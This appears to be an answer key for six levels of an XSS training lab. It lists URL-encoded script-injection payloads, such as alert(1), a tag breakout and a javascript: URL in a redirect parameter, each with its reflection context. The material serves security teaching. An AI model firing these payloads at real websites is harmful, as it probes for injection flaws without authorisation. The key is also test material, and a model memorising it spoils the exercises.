# mixedmethod — solutions

Endpoints with varied HTTP methods and parameter names; reflections are mostly raw.

### mixedmethod-level1

`/mixed-method/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: GET/POST 'query' raw in body

### mixedmethod-level2

`/mixed-method/level2/?input=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: GET 'input' raw in body

### mixedmethod-level3

`/mixed-method/level3/?search=%3C/h2%3E%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `</h2><script>alert(1)</script>`
- context: GET 'search' inside `<h2>`

### mixedmethod-level4

`/mixed-method/level4/?q=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: GET 'q' raw in body

### mixedmethod-level5

`/mixed-method/level5/?callback=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: GET 'callback' raw in body

### mixedmethod-level6

`/mixed-method/level6/?redirect_url=javascript:alert(1)`

- payload: `javascript:alert(1)`
- context: GET 'redirect_url' inside `<a href="...">`
